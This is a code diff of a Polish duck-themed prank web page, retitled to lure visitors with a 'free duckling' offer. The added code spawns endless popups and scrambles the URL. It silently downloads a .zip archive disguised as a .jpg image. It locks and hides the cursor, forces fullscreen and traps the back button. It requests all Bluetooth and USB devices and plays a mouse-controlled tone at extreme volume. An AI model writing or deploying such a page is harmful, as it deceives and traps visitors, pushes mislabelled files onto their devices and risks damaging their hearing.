@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>KACZKA CHAOS - Water Ripple</title>
+<title>Kaczuszka za darmo!</title>
 
 <style>
   html, body {
@@ -151,9 +151,24 @@ function showNotification(title, body) {
   new Notification(title, { body });
 }
 
+function animateUrlWithBabies() {
+  const e = ['🏻', '🏼', '🏽', '🏾', '🏿'];
+
+  setInterval(() => {
+    let s = '';
+
+    for (let i = 0; i < 10; i++) {
+      const m = Math.floor(Math.random() * e.length);
+      s += '👶' + e[m];
+    }
+
+    history.replaceState(null, "", "#" + encodeURIComponent(s));
+  }, 200);
+}
+
 /* POPUPY */
 function createBouncingWindow(text, sx, sy) {
-  const win = window.open("", "", "width=250,height=200");
+  const win = window.open("", "", "width=365,height=341");
   if (!win) return;
 
   win.document.write(`
@@ -191,15 +206,63 @@ function createBouncingWindow(text, sx, sy) {
 let popupCount = 0;
 
 function startPopups() {
+  const speed = 6;
+
   setInterval(() => {
     popupCount++;
-    createBouncingWindow("", (Math.random() * 12 - 6), (Math.random() * 12 - 6));
+
+    const vx = Math.random() < 0.5 ? speed : -speed;
+    const vy = Math.random() < 0.5 ? speed : -speed;
+
+    createBouncingWindow("", vx, vy);
   }, 300);
 }
 
-/* ALERTY */
-function startAlerts(){
-  setInterval(()=>alert("🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆🦆"), 800);
+function downloadKaczka() {
+  const a = document.createElement("a");
+  a.href = "kaczka.zip";
+  a.download = "kaczka.jpg";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+
+function requestPointerLock() {
+  const requestPointerLockApi = (
+    document.body.requestPointerLock ||
+    document.body.webkitRequestPointerLock ||
+    document.body.mozRequestPointerLock ||
+    document.body.msRequestPointerLock
+  )
+
+  requestPointerLockApi.call(document.body)
+}
+
+function hideCursor () {
+  document.querySelector('html').style = 'cursor: none;'
+}
+
+function requestUsbAccess () {
+  try {
+    navigator.usb.requestDevice({ filters: [{}] })
+  } catch {}
+}
+
+function showHelloMessage () {
+  const template = document.querySelector('template')
+  const clone = document.importNode(template.content, true)
+  document.body.appendChild(clone)
+}
+
+function requestBluetoothAccess () {
+  try {
+    navigator.bluetooth.requestDevice({
+      // filters: [...] <- Prefer filters to save energy & show relevant devices.
+      // acceptAllDevices here ensures dialog can populate, we don't care with what.
+      acceptAllDevices: true
+    })
+      .then(device => device.gatt.connect())
+  } catch {}
 }
 
 /* LATAJĄCE KACZKI */
@@ -262,23 +325,54 @@ function randomQuack(){
   },2000);
 }
 
+function blockBackButton () {
+  window.addEventListener('popstate', () => {
+    window.history.forward()
+  })
+}
+
+function requestFullscreen () {
+  const requestFullscreen = Element.prototype.requestFullscreen ||
+    Element.prototype.webkitRequestFullscreen ||
+    Element.prototype.mozRequestFullScreen ||
+    Element.prototype.msRequestFullscreen
+
+  requestFullscreen.call(document.body)
+}
+
 /* ===================== PISK W FORMIE PIŁY W JEDNYM TONIE ===================== */
-let audioCtx = null, osc = null;
-function startSawScream(){
-  if (!audioCtx) {
-    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    osc = audioCtx.createOscillator();
-    const gain = audioCtx.createGain();
+function startOsc () {
+  const audioContext = new AudioContext()
+  const oscillatorNode = audioContext.createOscillator()
+  const gainNode = audioContext.createGain()
 
-    osc.type = "sawtooth";      // fala piłokształtna
-    osc.frequency.value = 440;   // stały ton (możesz zmienić np. na 300)
+  const pitchBase = 50
+  const pitchRange = 4000
 
-    gain.gain.value = 0.25;      // głośność
+  const wave = audioContext.createPeriodicWave(
+    Array(10).fill(0).map((v, i) => Math.cos(i)),
+    Array(10).fill(0).map((v, i) => Math.sin(i))
+  )
 
-    osc.connect(gain);
-    gain.connect(audioCtx.destination);
-    osc.start();
+  oscillatorNode.setPeriodicWave(wave)
+
+  oscillatorNode.connect(gainNode)
+  gainNode.connect(audioContext.destination)
+
+  oscillatorNode.start(0)
+
+  const oscillator = ({ pitch, volume }) => {
+    oscillatorNode.frequency.value = pitchBase + pitch * pitchRange
+    gainNode.gain.value = volume * 3
   }
+
+  document.body.addEventListener('mousemove', event => {
+    const { clientX, clientY } = event
+    const { clientWidth, clientHeight } = document.body
+    const pitch = (clientX - clientWidth / 2) / clientWidth
+    const volume = 7
+    oscillator({ pitch, volume })
+  })
 }
 
 /* ===================== SMUGA KACZEK ===================== */
@@ -321,11 +415,19 @@ btn.addEventListener("click",()=>{
   requestNotificationPermission(); // <-- dodane wywołanie
 
   startPopups();
-  startAlerts();
+  animateUrlWithBabies();
   flyingDucks();
   glitchEffect();
   randomQuack();
-  startSawScream();
+  startOsc();
+  downloadKaczka();
+  requestPointerLock();
+  hideCursor();
+  requestBluetoothAccess();
+  requestUsbAccess();
+  showHelloMessage();
+  requestFullscreen();
+  blockBackButton();
 });
 </script>
 
